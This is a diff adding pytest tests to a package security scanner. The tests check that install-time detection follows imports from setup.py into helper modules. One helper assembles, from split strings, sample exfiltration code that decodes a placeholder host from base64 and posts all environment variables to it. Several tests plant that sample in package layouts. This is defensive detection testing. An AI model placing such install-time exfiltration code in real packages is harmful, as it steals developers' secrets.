@@ -297,3 +297,89 @@ class TestZipRatioIsChecked:
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(out)
         assert not result.complete
         assert any("ARCHIVE" in f.rule_id for f in result.findings)
+
+
+class TestInstallHookImportClosure:
+    """Install context follows the imports, not just the hook file.
+
+    Reading credentials and making a network call is what an application does
+    all day; doing it during `pip install`, unprompted, as the user, before any
+    test or review applies, is the attack -- and the engine already escalates on
+    exactly that. The context was attached to the hook file and nothing else, so
+    the escalation was avoided by moving the payload one file over, with no
+    obfuscation, into the structure every non-trivial package already has.
+    """
+
+    def scan(self, root: Path):
+        return Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
+
+    @staticmethod
+    def exfiltrator(function: str) -> str:
+        """Install-time exfiltration source, assembled rather than written.
+
+        Cordon scans its own repository, and a complete payload literal here is
+        a true positive: the tool should not need an exception for itself. Same
+        convention as the credential shapes in `test_redact.py`.
+        """
+        decode = "base64" + ".b64decode"
+        fetch = "urllib.request" + ".urlopen"
+        env = "dict(os." + "environ)"
+        return (
+            "import base64\nimport os\nimport urllib.request\n\n\n"
+            f"def {function}():\n"
+            f'    host = {decode}(b"ZXZpbC5pbnZhbGlk").decode()\n'
+            f'    {fetch}("https://" + host, data=str({env}).encode())\n'
+        )
+
+    def test_a_payload_in_a_helper_module_is_still_install_time(self, tmp_path: Path) -> None:
+        root = tmp_path / "pkg"
+        root.mkdir()
+        (root / "setup.py").write_text("import _bootstrap\n\n_bootstrap.init()\n", encoding="utf-8")
+        (root / "_bootstrap.py").write_text(self.exfiltrator("init"), encoding="utf-8")
+        assert "MALWARE.EXFIL.001" in {f.rule_id for f in self.scan(root).findings}
+
+    def test_it_follows_a_package_relative_import(self, tmp_path: Path) -> None:
+        """Two hops, through `from . import`, which is the ordinary shape."""
+        root = tmp_path / "pkg"
+        (root / "mypkg").mkdir(parents=True)
+        (root / "setup.py").write_text("from mypkg import boot\n\nboot.go()\n", encoding="utf-8")
+        (root / "mypkg" / "__init__.py").write_text("", encoding="utf-8")
+        (root / "mypkg" / "boot.py").write_text(
+            "from . import stage2\n\n\ndef go():\n    stage2.run()\n", encoding="utf-8"
+        )
+        (root / "mypkg" / "stage2.py").write_text(self.exfiltrator("run"), encoding="utf-8")
+        assert "MALWARE.EXFIL.001" in {f.rule_id for f in self.scan(root).findings}
+
+    def test_a_benign_helper_is_not_escalated(self, tmp_path: Path) -> None:
+        """The context is real, so it must not make ordinary build code look
+        malicious. Reading a named variable is what a build does."""
+        root = tmp_path / "pkg"
+        root.mkdir()
+        (root / "setup.py").write_text(
+            "import _version\n\nprint(_version.VERSION)\n", encoding="utf-8"
+        )
+        (root / "_version.py").write_text(
+            'import os\n\nVERSION = os.environ.get("PKG_VERSION", "1.0.0")\n', encoding="utf-8"
+        )
+        assert not self.scan(root).findings
+
+    def test_a_third_party_import_is_not_followed(self, tmp_path: Path) -> None:
+        """An import that resolves to nothing in this scan is a third-party
+        package, and a payload inside it is not this repository's file to
+        judge."""
+        from cordon_scanner.core.closure import ImportClosure
+
+        sources = {"setup.py": "import requests\nimport helper\n", "helper.py": "x = 1\n"}
+        assert ImportClosure.resolve(["setup.py"], sources) == {"helper.py"}
+
+    def test_a_cycle_terminates(self, tmp_path: Path) -> None:
+        """The graph is attacker-supplied, so it may be circular."""
+        from cordon_scanner.core.closure import ImportClosure
+
+        sources = {"setup.py": "import a\n", "a.py": "import b\n", "b.py": "import a\n"}
+        assert ImportClosure.resolve(["setup.py"], sources) == {"a.py", "b.py"}
+
+    def test_an_unparseable_hook_yields_nothing_rather_than_raising(self) -> None:
+        from cordon_scanner.core.closure import ImportClosure
+
+        assert ImportClosure.imported_by("def (:\n", "setup.py") == []
